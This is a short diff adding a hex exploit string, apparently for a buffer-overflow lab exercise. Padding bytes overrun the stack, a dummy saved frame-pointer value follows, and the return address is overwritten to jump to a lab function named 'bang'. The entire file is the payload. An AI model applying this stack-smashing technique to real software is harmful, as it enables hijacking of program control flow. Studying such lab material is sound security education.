@@ -1,0 +1,7 @@
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38 /* run out the stack space */
+c0 3b 68 55 /* dummy old edb value */
+d1 8c 04 08 /* esp position, content = &bang */
